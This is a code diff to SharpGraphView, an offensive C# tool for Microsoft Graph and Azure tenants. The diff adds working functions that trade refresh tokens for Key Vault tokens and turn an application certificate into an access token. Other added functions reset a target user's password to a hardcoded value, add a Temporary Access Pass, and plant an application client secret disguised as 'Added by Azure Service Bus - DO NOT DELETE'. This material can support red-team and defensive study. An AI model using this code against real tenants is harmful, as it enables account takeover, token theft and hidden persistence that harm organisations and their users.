@@ -8,6 +8,10 @@ using System.Net.Http.Headers;
 using System.Collections.Generic;
 using System.Text;
 using System.Threading.Tasks;
+using System.Security.Cryptography.X509Certificates;
+using Microsoft.IdentityModel.Tokens;
+using System.IdentityModel.Tokens.Jwt;
+using System.Security.Claims;
 
 namespace SharpGraphView
 {
@@ -21,11 +25,12 @@ SharpGraphView by @mlcsec
 
 Usage:
 
-    SharpGraphView.exe [Method] [-Domain <domain>] [-Tenant <tenant id>] [-Id <object id>] [-Select <display property>] [-Query <api endpoint>] [-Search <string> -Entity <entity>] [-Token <access token>]
+    SharpGraphView.exe [Method] [-Domain <domain>] [-Tenant <tenant id>] [-Id <object id>] [-Select <display property>] [-Query <api endpoint>] [-Search <string> -Entity <entity>] [-Token <access token>] [-Cert <pfx cert>]
 
 Flags:
 
     -Token                                   - Microsoft Graph access token or refresh token for FOCI abuse
+    -Cert                                    - X509Certificate path
     -Domain                                  - Target domain 
     -Tenant                                  - Target tenant ID
     -Id                                      - ID of target object
@@ -41,6 +46,8 @@ Auth:
     Get-TenantID                             - Get tenant ID for target domain
     Invoke-RefreshToMSGraphToken             - Convert refresh token to Micrsoft Graph token (saved to new_graph_tokens.txt)
     Invoke-RefreshToAzureManagementToken     - Convert refresh token to Azure Management token (saved to az_tokens.txt)
+    Invoke-RefreshToVaultToken               - Convert refresh token to Azure Vault token (saved to vault_tokens.txt)
+    Invoke-CertToAccessToken                 - Convert Azure Application certificate to JWT access token (saved to cert_tokens.txt)
 
 Post-Auth:
 
@@ -92,6 +99,9 @@ Post-Auth:
     Invoke-Search                            - Search for string within entity type (driveItem, message, chatMessage, site, event) 
     Find-PrivilegedRoleUsers                 - Find users with privileged roles assigned
     Invoke-CustomQuery                       - Custom GET query to target Graph API endpoint
+    Update-UserPassword                      - Update the passwordProfile of the target user (NewUserS3cret@Pass!)
+    Add-ApplicationPassword                  - Add client secret to target application
+    Add-UserTAP                              - Add new Temporary Access Password (TAP) to target user
 
 Examples:
 
@@ -131,6 +141,21 @@ Examples:
             }
         }
 
+        static X509Certificate2 GetCertificate(string filePath)
+        {
+            try
+            {
+                // Load the certificate from file
+                X509Certificate2 cert = new X509Certificate2(filePath);
+                return cert;
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine($"[-] Error loading certificate from file: {ex.Message}");
+                throw;
+            }
+        }
+
         static void ParseArgs(string[] args)
         {
             int iter = 0;
@@ -142,6 +167,10 @@ Examples:
                     case "-token":
                     case "-Token":
                         Config.accessToken = GetAccessToken(args[iter + 1]);
+                        break;
+                    case "-cert":
+                    case "-Cert":
+                        Config.cert = GetCertificate(args[iter + 1]);
                         break;
                     case "-id":
                     case "iD":
@@ -313,8 +342,8 @@ Examples:
                 {
                     Console.WriteLine("\n[*] Get-TenantID");
 
-                   using (HttpClient client = new HttpClient())
-                   {
+                    using (HttpClient client = new HttpClient())
+                    {
                         try
                         {
                             var response = await client.GetAsync($"https://login.microsoftonline.com/{Config.domain}/.well-known/openid-configuration");
@@ -437,13 +466,13 @@ Examples:
                     headers["User-Agent"] = UserAgent;
 
                     var body = new Dictionary<string, string>
-                {
-                    { "resource", Resource },
-                    { "client_id", ClientId },
-                    { "grant_type", "refresh_token" },
-                    { "refresh_token", refreshToken },
-                    { "scope", "openid" }
-                };
+                    {
+                        { "resource", Resource },
+                        { "client_id", ClientId },
+                        { "grant_type", "refresh_token" },
+                        { "refresh_token", refreshToken },
+                        { "scope", "openid" }
+                    };
 
                     using (HttpClient client = new HttpClient())
                     {
@@ -483,6 +512,158 @@ Examples:
                         {
                             Console.WriteLine($"[-] Failed to get Azure Management token: {response.ReasonPhrase}");
                         }
+                    }
+                }
+            }
+
+
+            // Invoke-RefreshToVaultToken
+
+            if (string.Equals(command, "Invoke-RefreshToVaultToken", StringComparison.CurrentCultureIgnoreCase))
+            {
+                if (string.IsNullOrEmpty(Config.accessToken))
+                {
+                    Console.WriteLine("\n[!] No token supplied");
+                    Console.WriteLine("SharpGraphView.exe Invoke-RefreshToVaultToken -tenant <tenant id>");
+                    Environment.Exit(0);
+                }
+                else
+                {
+                    Console.WriteLine("\n[*] Invoke-RefreshToVaultToken");
+
+                    string UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.19042";
+                    string ClientId = "d3590ed6-52b3-4102-aeff-aad2292ab01c";
+                    string refreshToken = $"{Config.accessToken}";
+                    string scope = "https://vault.azure.net/.default";
+
+                    // add/check other device types
+                    var headers = new Dictionary<string, string>();
+                    headers["User-Agent"] = UserAgent;
+
+                    var body = new Dictionary<string, string>
+                    {
+                        { "client_id", ClientId },
+                        { "grant_type", "refresh_token" },
+                        { "refresh_token", refreshToken },
+                        { "scope", scope }
+                    };
+
+                    using (HttpClient client = new HttpClient())
+                    {
+                        var content = new FormUrlEncodedContent(body);
+                        foreach (var header in headers)
+                        {
+                            client.DefaultRequestHeaders.Add(header.Key, header.Value);
+                        }
+
+                        var response = await client.PostAsync("https://login.microsoftonline.com/common/oauth2/v2.0/token", content);
+                        if (response.IsSuccessStatusCode)
+                        {
+                            Console.WriteLine("\n[+] Token Obtained!");
+
+                            var tokenResponse = await response.Content.ReadAsStringAsync();
+                            JObject tokenJson = JObject.Parse(tokenResponse);
+
+                            foreach (var property in tokenJson.Properties())
+                            {
+                                Console.WriteLine($"[*] {property.Name}: {property.Value}");
+                            }
+
+                            // save to file
+                            string filePath = "vault_tokens.txt";
+                            using (StreamWriter writer = File.AppendText(filePath))
+                            {
+                                writer.WriteLine($"[+] Token Obtained! ({DateTime.Now})");
+                                foreach (var property in tokenJson.Properties())
+                                {
+                                    writer.WriteLine($"[*] {property.Name}: {property.Value}");
+                                }
+                                writer.WriteLine();
+                            }
+                            Console.WriteLine($"\n[+] Token information written to '{filePath}'.");
+                        }
+                        else
+                        {
+                            Console.WriteLine($"[-] Failed to get Azure Vault token: {response.ReasonPhrase}");
+                        }
+                    }
+                }
+            }
+
+            // Invoke-CertToAccessToken
+
+            if (string.Equals(command, "Invoke-CertToAccessToken", StringComparison.CurrentCultureIgnoreCase))
+            {
+                if (string.IsNullOrEmpty(Config.tenant) || Config.cert == null || Config.id == null)
+                {
+                    Console.WriteLine("\n[!] No tenant or certificate supplied");
+                    Console.WriteLine("SharpGraphView.exe Invoke-CertToAccessToken -tenant <tenant id> -cert <path_to_certificate> -id <appid>");
+                    Environment.Exit(0);
+                }
+                else
+                {
+                    Console.WriteLine("\n[*] Invoke-CertToAccessToken");
+
+                    string tenantId = Config.tenant;
+                    string clientId = Config.id;
+                    X509Certificate2 cert = Config.cert;
+                    string audience = $"https://login.microsoftonline.com/{tenantId}/oauth2/v2.0/token";
+
+                    var handler = new JwtSecurityTokenHandler();
+                    var descriptor = new SecurityTokenDescriptor
+                    {
+                        Issuer = clientId,
+                        Subject = new ClaimsIdentity(new Claim[]
+                        {
+                            new Claim("sub", clientId)
+                        }),
+                        Audience = audience,
+                        Expires = DateTime.UtcNow.AddMinutes(120),
+                        SigningCredentials = new X509SigningCredentials(cert)
+                    };
+
+                    var token = handler.CreateJwtSecurityToken(descriptor);
+                    var jwtToken = handler.WriteToken(token);
+
+                    var httpClient = new HttpClient();
+                    var content = new FormUrlEncodedContent(new[]
+                    {
+                        new KeyValuePair<string, string>("grant_type", "client_credentials"),
+                        new KeyValuePair<string, string>("client_id", clientId),
+                        new KeyValuePair<string, string>("client_assertion_type", "urn:ietf:params:oauth:client-assertion-type:jwt-bearer"),
+                        new KeyValuePair<string, string>("client_assertion", jwtToken),
+                        new KeyValuePair<string, string>("scope", "https://graph.microsoft.com/.default")
+                    });
+
+                    var response = await httpClient.PostAsync($"https://login.microsoftonline.com/{tenantId}/oauth2/v2.0/token", content);
+
+                    if (response.IsSuccessStatusCode)
+                    {
+                        Console.WriteLine("\n[+] Token Obtained!");
+
+                        var tokenResponse = await response.Content.ReadAsStringAsync();
+                        JObject tokenJson = JObject.Parse(tokenResponse);
+
+                        foreach (var property in tokenJson.Properties())
+                        {
+                            Console.WriteLine($"[*] {property.Name}: {property.Value}");
+                        }
+
+                        string filePath = "cert_tokens.txt";
+                        using (StreamWriter writer = File.AppendText(filePath))
+                        {
+                            writer.WriteLine($"[+] Token Obtained! ({DateTime.Now})");
+                            foreach (var property in tokenJson.Properties())
+                            {
+                                writer.WriteLine($"[*] {property.Name}: {property.Value}");
+                            }
+                            writer.WriteLine();
+                        }
+                        Console.WriteLine($"\n[+] Token information written to '{filePath}'.");
+                    }
+                    else
+                    {
+                        Console.WriteLine($"[-] Failed to get certificate access token: {response.ReasonPhrase}");
                     }
                 }
             }
@@ -1111,7 +1292,7 @@ Examples:
                 else
                 {
                     Console.WriteLine("\n[*] Invoke-CustomQuery");
-                    
+
                     if (!string.IsNullOrEmpty(Config.select))
                     {
                         Config.query += "?$select=" + Config.select;
@@ -1180,11 +1361,65 @@ Examples:
                     await GraphApiGET(Config.accessToken, apiUrl);
                 }
             }
+
+
+            // passwordProfile update
+            if (string.Equals(command, "Update-UserPassword", StringComparison.CurrentCultureIgnoreCase))
+            {
+                if (string.IsNullOrEmpty(Config.id))
+                {
+                    Console.WriteLine("\n[!] No ID supplied");
+                    Console.WriteLine("SharpGraph.exe Update-UserPassword -id <user id or upn> -token <access token>");
+                    Environment.Exit(0);
+                }
+                else
+                {
+                    Console.WriteLine("\n[*] Update-UserPassword");
+
+                    await UpdateUserPATCH(Config.accessToken, Config.id);
+                }
+            }
+
+
+            // Application addPassword 
+            if (string.Equals(command, "Add-ApplicationPassword", StringComparison.CurrentCultureIgnoreCase))
+            {
+                if (string.IsNullOrEmpty(Config.id))
+                {
+                    Console.WriteLine("\n[!] No ID supplied");
+                    Console.WriteLine("SharpGraph.exe Add-ApplicationPassword -id <app id> -token <access token>");
+                    Environment.Exit(0);
+                }
+                else
+                {
+                    Console.WriteLine("\n[*] Add-ApplicationPassword");
+
+                    //await UpdateUserPATCH(Config.accessToken, Config.id);
+                    await AddAppPwPOST(Config.accessToken, Config.id);
+                }
+            }
+
+
+            if (string.Equals(command, "Add-UserTAP", StringComparison.CurrentCultureIgnoreCase))
+            {
+                if (string.IsNullOrEmpty(Config.id))
+                {
+                    Console.WriteLine("\n[!] No ID supplied");
+                    Console.WriteLine("SharpGraph.exe Add-UserTAP -id <user id> -token <access token>");
+                    Environment.Exit(0);
+                }
+                else
+                {
+                    Console.WriteLine("\n[*] Add-UserTAP");
+
+                    await NewTAPPOST(Config.accessToken, Config.id);
+                }
+            }
         }
 
 
-        // Base GET Request Function
-        static async Task GraphApiGET(string accessToken, string url)
+            // Base GET Request Function
+            static async Task GraphApiGET(string accessToken, string url)
         {
             try
             {
@@ -1310,49 +1545,144 @@ Examples:
         }
 
 
-        // PATCH - TODO 
-        //static async Task GraphApiPATCH(string accessToken, string url)
-        //...
-        /*
-
-        Update-UserPassword*
-
-         PATCH https://graph.microsoft.com/v1.0/users/{id}
-        Content-type: application/json
-
+        static async Task UpdateUserPATCH(string accessToken, string id)
         {
-          "passwordProfile": {
-            "forceChangePasswordNextSignIn": false,
-            "password": "xWwvJ]6NMw+bWH-d"
-          }
+
+            HttpClient client = new HttpClient();
+            client.DefaultRequestHeaders.Authorization = new System.Net.Http.Headers.AuthenticationHeaderValue("Bearer", accessToken);
+
+            // Construct the request URL
+            string requestUrl = $"https://graph.microsoft.com/v1.0/users/{id}";
+
+            // JSON payload for the update
+            string jsonPayload = @"
+            {
+                ""passwordProfile"": {
+                    ""forceChangePasswordNextSignIn"": false,
+                    ""password"": ""NewUserSecret@Pass!""
+                }
+            }";
+
+            // Create a PATCH request
+            var request = new HttpRequestMessage(new HttpMethod("PATCH"), requestUrl)
+            {
+                Content = new StringContent(jsonPayload, Encoding.UTF8, "application/json")
+            };
+
+            // Send the PATCH request
+            HttpResponseMessage response = await client.SendAsync(request);
+
+            if (response.IsSuccessStatusCode)
+            {
+                Console.WriteLine("[+] User password profile updated successfully");
+            }
+            else
+            {
+                Console.WriteLine($"[-] Error: {response.StatusCode} - {response.ReasonPhrase}");
+                string errorContent = await response.Content.ReadAsStringAsync();
+                Console.WriteLine($"[-] Error content: {errorContent}");
+            }
         }
 
-        
-        Add-ApplicationPassword*
 
-        POST https://graph.microsoft.com/v1.0/applications/{id}/addPassword
-        Content-type: application/json
-
+        static async Task AddAppPwPOST(string accessToken, string id)
         {
-          "passwordCredential": {
-            "displayName": "Password friendly name"
-          }
+            HttpClient client = new HttpClient();
+            client.DefaultRequestHeaders.Authorization = new System.Net.Http.Headers.AuthenticationHeaderValue("Bearer", accessToken);
+
+            // Construct the request URL
+            string requestUrl = $"https://graph.microsoft.com/v1.0/applications/{id}/addPassword";
+
+            // JSON payload for the request
+            string jsonPayload = @"
+            {
+                ""displayName"": ""Added by Azure Service Bus - DO NOT DELETE"",
+                ""endDateTime"": """ + DateTime.UtcNow.AddMonths(6).ToString("yyyy-MM-ddTHH:mm:ssZ") + @"""
+            }";
+
+            // Create a POST request
+            var request = new HttpRequestMessage(HttpMethod.Post, requestUrl)
+            {
+                Content = new StringContent(jsonPayload, Encoding.UTF8, "application/json")
+            };
+
+            // Send the POST request
+            HttpResponseMessage response = await client.SendAsync(request);
+
+            if (response.IsSuccessStatusCode)
+            {
+                string responseBody = await response.Content.ReadAsStringAsync();
+                Console.WriteLine("[+] Password added to application successfully");
+
+                var result = JObject.Parse(responseBody);
+
+                foreach (var property in result)
+                {
+                    if (!property.Key.StartsWith("@odata.context"))
+                    {
+                        Console.WriteLine($"{property.Key}: {property.Value}");
+                    }
+                }
+            }
+            else
+            {
+                Console.WriteLine($"[-] Error: {response.StatusCode} - {response.ReasonPhrase}");
+                string errorContent = await response.Content.ReadAsStringAsync();
+                Console.WriteLine($"[-] Error content: {errorContent}");
+            }
         }
-         
 
-        New-TemporaryAccessPassword (TAP)*
 
-        POST https://graph.microsoft.com/v1.0/users/071cc716-8147-4397-a5ba-b2105951cc0b/authentication/temporaryAccessPassMethods
-        Content-Type: application/json
 
+        // New-TAP
+
+        static async Task NewTAPPOST(string accessToken, string id)
         {
-            "startDateTime": "2022-06-05T00:00:00.000Z",  // DateTime startDateTime = DateTime.Now.AddMinutes(60);
-            "lifetimeInMinutes": 60,
-            "isUsableOnce": false
+            HttpClient client = new HttpClient();
+            client.DefaultRequestHeaders.Authorization = new System.Net.Http.Headers.AuthenticationHeaderValue("Bearer", accessToken);
+
+            // Construct the request URL
+            string requestUrl = $"https://graph.microsoft.com/v1.0/users/{id}/authentication/temporaryAccessPassMethods";
+
+            // JSON payload for the request
+            string jsonPayload = @"
+            {
+                ""properties"": {
+                    ""isUsableOnce"": true,
+                    ""startDateTime"": """ + DateTime.UtcNow.AddMinutes(60).ToString("yyyy-MM-ddTHH:mm:ssZ") + @"""
+                }
+            }";
+
+            // Create a POST request
+            var request = new HttpRequestMessage(HttpMethod.Post, requestUrl)
+            {
+                Content = new StringContent(jsonPayload, Encoding.UTF8, "application/json")
+            };
+
+            // Send the POST request
+            HttpResponseMessage response = await client.SendAsync(request);
+
+            if (response.IsSuccessStatusCode)
+            {
+                string responseBody = await response.Content.ReadAsStringAsync();
+                Console.WriteLine("[+] TAP added successfully");
+
+                var result = JObject.Parse(responseBody);
+
+                foreach (var property in result)
+                {
+                    if (!property.Key.StartsWith("@odata.context"))
+                    {
+                        Console.WriteLine($"{property.Key}: {property.Value}");
+                    }
+                }
+            }
+            else
+            {
+                Console.WriteLine($"[-] Error: {response.StatusCode} - {response.ReasonPhrase}");
+                string errorContent = await response.Content.ReadAsStringAsync();
+                Console.WriteLine($"[-] Error content: {errorContent}");
+            }
         }
-         */
-
-        // check read me for other endpoints to add
-
     }
 }
